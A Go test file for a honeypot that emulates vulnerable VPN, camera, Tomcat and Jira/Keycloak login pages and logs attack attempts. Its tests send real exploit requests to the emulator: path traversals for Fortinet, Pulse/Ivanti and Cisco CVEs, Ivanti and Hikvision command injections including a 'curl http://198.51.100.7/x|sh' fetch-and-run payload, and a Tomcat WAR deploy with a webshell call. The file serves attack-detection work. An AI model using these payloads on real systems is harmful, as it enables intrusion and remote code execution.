package main

import (
	"bufio"
	"encoding/base64"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"strconv"
	"strings"
	"testing"
	"time"
)

// lureDo schickt eine rohe Anfrage an den Web-Honeypot und liefert Antwort, Inhalt und Ereignisse.
func lureDo(t *testing.T, m *Manager, raw string) (*http.Response, string, []Event) {
	t.Helper()
	c, done := run(t, m, "http", "emulate")
	go c.Write([]byte(raw))
	c.SetReadDeadline(time.Now().Add(5 * time.Second))
	resp, err := http.ReadResponse(bufio.NewReader(c), nil)
	if err != nil {
		t.Fatalf("keine Antwort auf %q: %v", strings.SplitN(raw, "\r\n", 2)[0], err)
	}
	b, _ := io.ReadAll(resp.Body)
	c.Close()
	waitDone(t, done, 5*time.Second)
	return resp, string(b), events(m)
}

func lureGet(path string, hdr ...string) string {
	return "GET " + path + " HTTP/1.1\r\nHost: web01\r\n" + strings.Join(hdr, "") + "Connection: close\r\n\r\n"
}

func lurePost(path, ctype, body string, hdr ...string) string {
	return "POST " + path + " HTTP/1.1\r\nHost: web01\r\nContent-Type: " + ctype + "\r\n" + strings.Join(hdr, "") +
		"Content-Length: " + strconv.Itoa(len(body)) + "\r\nConnection: close\r\n\r\n" + body
}

func basic(u, p string) string {
	return "Authorization: Basic " + base64.StdEncoding.EncodeToString([]byte(u+":"+p)) + "\r\n"
}

// lureTest: Manager mit allen Ködern und ohne Wartezeiten.
func lureTest(t *testing.T, lures string) *Manager {
	old := lureSleep
	lureSleep = func(time.Duration) {}
	t.Cleanup(func() { lureSleep = old })
	m := testManager()
	on, ok := lureSet(lures, "")
	if !ok {
		t.Fatalf("lureSet(%q)", lures)
	}
	m.lures.Store(&on)
	return m
}

func findEv(evs []Event, typ string) []Event {
	var out []Event
	for _, e := range evs {
		if e.Type == typ {
			out = append(out, e)
		}
	}
	return out
}

func dataStr(e Event, k string) string {
	s, _ := e.Data[k].(string)
	return s
}

func TestLureSet(t *testing.T) {
	for _, c := range []struct {
		setting, profile string
		want             []string
	}{
		{"", "", lureNames},
		{"", "ip-camera", []string{"hikvision", "onvif"}},
		{"", "linux-server", []string{"tomcat", "java-app"}},
		{"", "router", nil},
		{"off", "", nil},
		{"all", "router", lureNames},
		{"tomcat, java-app", "router", []string{"tomcat", "java-app"}},
	} {
		on, ok := lureSet(c.setting, c.profile)
		if !ok || len(on) != len(c.want) {
			t.Errorf("%q/%q: %v %v", c.setting, c.profile, ok, on)
		}
		for _, n := range c.want {
			if !on[n] {
				t.Errorf("%q/%q: %s fehlt", c.setting, c.profile, n)
			}
		}
	}
	if _, ok := lureSet("tomcat,quatsch", ""); ok {
		t.Error("unbekannter Köder angenommen")
	}
	for p := range profiles {
		if _, ok := profileLures[p]; !ok {
			t.Errorf("Profil %q ohne Köder-Zuordnung", p)
		}
	}
	c := Config{Lures: "quatsch"}
	if w := c.Normalize(0); c.Lures != "" || !strings.Contains(strings.Join(w, ";"), "Köder") {
		t.Errorf("Normalize: %q %v", c.Lures, w)
	}
}

func TestLureFortinet(t *testing.T) {
	m := lureTest(t, "all")
	resp, body, evs := lureDo(t, m, lureGet("/remote/login?lang=en"))
	if resp.StatusCode != 200 || resp.Header.Get("Server") != fortiServer || !strings.Contains(body, `name="credential"`) {
		t.Errorf("Login-Seite: %d %q", resp.StatusCode, resp.Header.Get("Server"))
	}
	if r := findEv(evs, "request"); len(r) != 1 || dataStr(r[0], "lure") != "fortinet" {
		t.Errorf("Ereignis ohne lure: %+v", r)
	}
	resp, body, evs = lureDo(t, m, lurePost("/remote/logincheck", "application/x-www-form-urlencoded", "ajax=1&username=vpnuser&credential=Sommer2024&realm="))
	if resp.StatusCode != 200 || !strings.Contains(body, "sslvpn_login_permission_denied") {
		t.Errorf("logincheck: %d %q", resp.StatusCode, body)
	}
	if l := findEv(evs, "login"); len(l) != 1 || l[0].Username != "vpnuser" || l[0].Password != "Sommer2024" {
		t.Errorf("Login nicht aufgezeichnet: %+v", l)
	}
	// CVE-2018-13379: die "Sitzungsdatei" enthält die Köder-Zugangsdaten
	_, body, _ = lureDo(t, m, lureGet("/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"))
	if !strings.HasPrefix(body, "var fgt_lang =") || !strings.Contains(body, bait().Pass) {
		t.Errorf("Sitzungsdatei ohne Köder: %q", body)
	}
	_, body, _ = lureDo(t, m, lureGet("/remote/fgt_lang?lang=en"))
	if strings.Contains(body, bait().Pass) || !strings.Contains(body, "var fgt_lang = {") {
		t.Errorf("normale Sprachdatei: %q", body)
	}
}

func TestLureIvanti(t *testing.T) {
	m := lureTest(t, "all")
	resp, body, _ := lureDo(t, m, lureGet("/dana-na/auth/url_default/welcome.cgi"))
	if resp.StatusCode != 200 || resp.Header.Get("Server") != "" || !strings.Contains(body, "Ivanti Connect Secure") {
		t.Errorf("Anmeldeseite: %d Server=%q", resp.StatusCode, resp.Header.Get("Server"))
	}
	resp, _, evs := lureDo(t, m, lurePost("/dana-na/auth/url_default/login.cgi", "application/x-www-form-urlencoded", "tz_offset=60&username=admin&password=Ivanti123&realm=Users"))
	if resp.StatusCode != 302 || !strings.Contains(resp.Header.Get("Location"), "p=failed") {
		t.Errorf("login.cgi: %d %q", resp.StatusCode, resp.Header.Get("Location"))
	}
	if l := findEv(evs, "login"); len(l) != 1 || l[0].Password != "Ivanti123" {
		t.Errorf("Login: %+v", l)
	}
	resp, body, _ = lureDo(t, m, lureGet("/api/v1/totp/user-backup-code/../../system/system-information"))
	var info map[string]any
	if resp.StatusCode != 200 || json.Unmarshal([]byte(body), &info) != nil || info["system-information"] == nil {
		t.Errorf("CVE-2023-46805: %d %q", resp.StatusCode, body)
	}
	_, _, evs = lureDo(t, m, lureGet("/api/v1/totp/user-backup-code/../../license/keys-status/%3Bcurl%20http%3A%2F%2F198.51.100.7%2Fx%7Csh"))
	if c := findEv(evs, "command"); len(c) != 1 || dataStr(c[0], "input") != ";curl http://198.51.100.7/x|sh" {
		t.Errorf("CVE-2024-21887 Befehl: %+v", c)
	}
	_, body, _ = lureDo(t, m, lureGet("/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/"))
	if !strings.HasPrefix(body, "root:x:0:0:") {
		t.Errorf("CVE-2019-11510: %q", body)
	}
}

func TestLureCisco(t *testing.T) {
	m := lureTest(t, "all")
	resp, body, _ := lureDo(t, m, lureGet("/+CSCOE+/logon.html"))
	if resp.StatusCode != 200 || !strings.Contains(body, "SSL VPN Service") || !strings.Contains(resp.Header.Get("Set-Cookie"), "webvpnlogin=1") {
		t.Errorf("Anmeldeseite: %d", resp.StatusCode)
	}
	_, body, evs := lureDo(t, m, lurePost("/+webvpn+/index.html", "application/x-www-form-urlencoded", "tgroup=&group_list=VPN&username=cisco&password=cisco&Login=Login"))
	if !strings.Contains(body, "Login failed.") || len(findEv(evs, "login")) != 1 {
		t.Errorf("Anmeldung: %q %+v", body, evs)
	}
	resp, _, _ = lureDo(t, m, lureGet("/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../"))
	if resp.StatusCode != 200 {
		t.Errorf("CVE-2020-3452: %d", resp.StatusCode)
	}
}

func TestLureHikvision(t *testing.T) {
	m := lureTest(t, "all")
	resp, body, _ := lureDo(t, m, lureGet("/SDK/webLanguage"))
	if resp.StatusCode != 200 || !strings.HasPrefix(resp.Header.Get("Content-Type"), "application/xml") || !strings.Contains(body, "<type>en</type>") {
		t.Errorf("webLanguage: %d %q", resp.StatusCode, body)
	}
	// CVE-2021-36260: Befehl wird aufgezeichnet, die Ausgabe kommt aus der statischen Shell
	x := `<?xml version="1.0" encoding="UTF-8"?><language>$(id>webLib/x)</language>`
	resp, _, evs := lureDo(t, m, "PUT /SDK/webLanguage HTTP/1.1\r\nHost: cam\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: "+strconv.Itoa(len(x))+"\r\nConnection: close\r\n\r\n"+x)
	if resp.StatusCode != 500 {
		t.Errorf("PUT: %d", resp.StatusCode)
	}
	if c := findEv(evs, "command"); len(c) != 1 || dataStr(c[0], "input") != "id>webLib/x" || dataStr(c[0], "cve") != "CVE-2021-36260" {
		t.Errorf("Befehl: %+v", c)
	}
	if _, body, _ := lureDo(t, m, lureGet("/x")); !strings.HasPrefix(body, "uid=0(root)") {
		t.Errorf("Ausgabe: %q", body)
	}
	if _, body, _ := lureDo(t, m, lureGet("/Security/users?auth=YWRtaW46MTEK")); !strings.Contains(body, "<userName>admin</userName>") {
		t.Errorf("CVE-2017-7921: %q", body)
	}
	resp, _, _ = lureDo(t, m, lureGet("/ISAPI/System/deviceInfo"))
	if resp.StatusCode != 401 || !strings.HasPrefix(resp.Header.Get("WWW-Authenticate"), "Digest ") {
		t.Errorf("ISAPI: %d %q", resp.StatusCode, resp.Header.Get("WWW-Authenticate"))
	}
}

func TestLureONVIF(t *testing.T) {
	m := lureTest(t, "all")
	resp, body, _ := lureDo(t, m, lurePost("/onvif/device_service", "application/soap+xml", `<s:Envelope><s:Body><tds:GetSystemDateAndTime/></s:Body></s:Envelope>`))
	if resp.StatusCode != 200 || !strings.Contains(body, "GetSystemDateAndTimeResponse") {
		t.Errorf("Zeit: %d %q", resp.StatusCode, body)
	}
	sec := `<s:Envelope><s:Header><wsse:Security><wsse:UsernameToken><wsse:Username>admin</wsse:Username>` +
		`<wsse:Password Type="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordText">12345</wsse:Password>` +
		`</wsse:UsernameToken></wsse:Security></s:Header><s:Body><tds:GetDeviceInformation/></s:Body></s:Envelope>`
	resp, body, evs := lureDo(t, m, lurePost("/onvif/device_service", "application/soap+xml", sec))
	if resp.StatusCode != 400 || !strings.Contains(body, "ter:NotAuthorized") {
		t.Errorf("Fault: %d", resp.StatusCode)
	}
	if l := findEv(evs, "login"); len(l) != 1 || l[0].Username != "admin" || l[0].Password != "12345" {
		t.Errorf("ONVIF-Login: %+v", l)
	}
}

func TestLureTomcat(t *testing.T) {
	m := lureTest(t, "all")
	resp, body, _ := lureDo(t, m, lureGet("/manager/text/list"))
	if resp.StatusCode != 401 || resp.Header.Get("WWW-Authenticate") != `Basic realm="Tomcat Manager Application"` || !strings.Contains(body, "tomcat-users.xml") {
		t.Errorf("ohne Anmeldung: %d %q", resp.StatusCode, resp.Header.Get("WWW-Authenticate"))
	}
	if resp.Header.Get("Server") != "nginx/1.24.0" {
		t.Errorf("Server-Kopfzeile des Profils erwartet: %q", resp.Header.Get("Server"))
	}
	resp, _, evs := lureDo(t, m, lureGet("/manager/text/list", basic("admin", "falsch")))
	if resp.StatusCode != 401 || len(findEv(evs, "login")) != 1 {
		t.Errorf("falsches Passwort: %d %+v", resp.StatusCode, findEv(evs, "login"))
	}
	resp, body, _ = lureDo(t, m, lureGet("/manager/text/list", basic("tomcat", "s3cret")))
	if resp.StatusCode != 200 || !strings.HasPrefix(body, "OK - Listed applications") {
		t.Errorf("Werkspasswort: %d %q", resp.StatusCode, body)
	}
	war := "PK\x03\x04fake-war"
	resp, body, evs = lureDo(t, m, "PUT /manager/text/deploy?path=/upd HTTP/1.1\r\nHost: web01\r\n"+basic("tomcat", "s3cret")+"Content-Length: "+strconv.Itoa(len(war))+"\r\nConnection: close\r\n\r\n"+war)
	if resp.StatusCode != 200 || body != "OK - Deployed application at context path [/upd]\n" {
		t.Errorf("Deploy: %d %q", resp.StatusCode, body)
	}
	if c := findEv(evs, "command"); len(c) != 1 || !strings.HasPrefix(dataStr(c[0], "input"), "tomcat deploy path=/upd") {
		t.Errorf("Deploy-Ereignis: %+v", c)
	}
	if _, body, _ := lureDo(t, m, lureGet("/manager/text/list", basic("tomcat", "s3cret"))); !strings.Contains(body, "/upd:running") {
		t.Errorf("Liste ohne eigene Anwendung: %q", body)
	}
	_, _, evs = lureDo(t, m, lureGet("/upd/cmd.jsp?cmd=uname+-a"))
	if c := findEv(evs, "command"); len(c) != 1 || dataStr(c[0], "input") != "uname -a" {
		t.Errorf("Webshell: %+v", c)
	}
}

func TestLureJavaApp(t *testing.T) {
	m := lureTest(t, "all")
	resp, body, _ := lureDo(t, m, lureGet("/rest/api/2/serverInfo"))
	var si map[string]any
	if resp.StatusCode != 200 || json.Unmarshal([]byte(body), &si) != nil || si["version"] != "8.20.10" || resp.Header.Get("X-AREQUESTID") == "" {
		t.Errorf("serverInfo: %d %q", resp.StatusCode, body)
	}
	_, body, evs := lureDo(t, m, lurePost("/login.jsp", "application/x-www-form-urlencoded", "os_username=jira&os_password=jira123&login=Log+In"))
	if !strings.Contains(body, "incorrect") {
		t.Errorf("Jira-Login: %q", body)
	}
	if l := findEv(evs, "login"); len(l) != 1 || l[0].Username != "jira" || l[0].Password != "jira123" {
		t.Errorf("Jira-Login-Ereignis: %+v", l)
	}
	resp, body, evs = lureDo(t, m, lurePost("/realms/master/protocol/openid-connect/token", "application/x-www-form-urlencoded", "grant_type=password&client_id=admin-cli&username=admin&password=admin"))
	if resp.StatusCode != 401 || !strings.Contains(body, "invalid_grant") || len(findEv(evs, "login")) != 1 {
		t.Errorf("Keycloak: %d %q", resp.StatusCode, body)
	}
	resp, body, _ = lureDo(t, m, lureGet("/auth/realms/master/.well-known/openid-configuration"))
	if resp.StatusCode != 200 || !strings.Contains(body, `"issuer":"http://web01/auth/realms/master"`) {
		t.Errorf("OIDC: %d %q", resp.StatusCode, body)
	}
	if resp, _, _ := lureDo(t, m, lureGet("/realms/fremd/account")); resp.StatusCode != 404 {
		t.Errorf("fremder Realm: %d", resp.StatusCode)
	}
	// Java4Shell: Base64 aus vollen 64er-Blöcken mit "=" in der Basic-Anmeldung
	resp, body, evs = lureDo(t, m, lureGet("/rest/api/2/myself", "Authorization: Basic "+strings.Repeat("A", 64)+"=\r\n"))
	if resp.StatusCode != 500 || !strings.Contains(body, "HTTP Status 500") {
		t.Errorf("Java4Shell: %d", resp.StatusCode)
	}
	if r := findEv(evs, "request"); len(r) != 1 || dataStr(r[0], "lure") != "java-app" {
		t.Errorf("Ereignis: %+v", r)
	}
}

// Ausgeschaltete Köder: der Pfad ist ein gewöhnlicher unbekannter Pfad (404 im Stil des Profils).
func TestLuresOff(t *testing.T) {
	m := lureTest(t, "off")
	resp, body, evs := lureDo(t, m, lureGet("/remote/login"))
	if resp.StatusCode != 404 || resp.Header.Get("Server") != "nginx/1.24.0" || !strings.Contains(body, "<center>nginx/1.24.0</center>") {
		t.Errorf("aus: %d %q", resp.StatusCode, resp.Header.Get("Server"))
	}
	if r := findEv(evs, "request"); len(r) != 1 || dataStr(r[0], "lure") != "" {
		t.Errorf("lure trotz aus: %+v", r)
	}
	// alte Tomcat-Antwort bleibt ohne Köder
	if resp, _, _ := lureDo(t, m, lureGet("/manager/html")); resp.StatusCode != 401 {
		t.Errorf("Tomcat ohne Köder: %d", resp.StatusCode)
	}
}

// Startseite in absoluter Form ohne Schrägstrich: Anmeldeseite statt Sprachmodell.
func TestHTTPAbsoluteFormRoot(t *testing.T) {
	m := lureTest(t, "off")
	resp, body, _ := lureDo(t, m, "GET http://web01 HTTP/1.1\r\nHost: web01\r\nConnection: close\r\n\r\n")
	if resp.StatusCode != 200 || !strings.Contains(body, `name="password"`) {
		t.Errorf("Startseite: %d %q", resp.StatusCode, body)
	}
}

// Leerer Pfad, Scannerpfade und 404 des Modells: keine Modellseite, die eigene 404.
func TestMimicWebSkipsAnd404(t *testing.T) {
	mimicOffUntil.Store(0)
	rec := &mimicRecorder{}
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		var req map[string]string
		json.NewDecoder(r.Body).Decode(&req)
		rec.add(req)
		if strings.Contains(req["input"], "/manager-alt") {
			json.NewEncoder(w).Encode(map[string]any{"out": "<h1>401</h1>", "status": 401, "content_type": "text/html",
				"headers": map[string]string{"WWW-Authenticate": `Basic realm="x"`, "Location": "http://198.51.100.9/", "Set-Cookie": "a=b\r\nX: y"}})
			return
		}
		json.NewEncoder(w).Encode(map[string]any{"out": "", "status": 404})
	}))
	defer srv.Close()
	m := testManager()
	m.em.hive = &HiveClient{URL: srv.URL, Token: "tok", Sensor: "test", HTTP: http.DefaultClient}
	s := &Session{m: m, SrcIP: "203.0.113.77", Service: "http"}
	req := httptest.NewRequest("GET", "/", nil)
	req.URL.Path = ""
	for _, r := range []*http.Request{req, httptest.NewRequest("GET", "/nmaplowercheck1795074035", nil), httptest.NewRequest("GET", "/x/aB3xK9qLm2Zp", nil)} {
		if _, _, _, _, ok := s.mimicWeb(r); ok {
			t.Errorf("%q: Modell gefragt", r.URL.Path)
		}
	}
	if n := len(rec.all()); n != 0 {
		t.Errorf("%d Anfragen an den Hive für leere oder Scannerpfade", n)
	}
	if _, _, _, _, ok := s.mimicWeb(httptest.NewRequest("GET", "/unbekannt.old", nil)); ok {
		t.Error("404 des Modells ausgeliefert statt der eigenen Seite")
	}
	st, _, _, hdr, ok := s.mimicWeb(httptest.NewRequest("GET", "/manager-alt/x", nil))
	if !ok || st != 401 || hdr["WWW-Authenticate"] != `Basic realm="x"` || hdr["Location"] != "" || hdr["Set-Cookie"] != "" || hdr["Content-Security-Policy"] == "" {
		t.Errorf("Kopfzeilen: %v %d %+v", ok, st, hdr)
	}
}

// Hive und Honeypot kennen dieselben Köder (wie TestServiceListsInSync).
func TestLureNamesInSync(t *testing.T) {
	b, err := os.ReadFile("../hive/sensors.go")
	if err != nil {
		t.Skipf("Hive-Quellen nicht lesbar: %v", err)
	}
	for _, n := range lureNames {
		if !strings.Contains(string(b), `"`+n+`"`) {
			t.Errorf("Köder %q fehlt in hive/sensors.go", n)
		}
	}
}
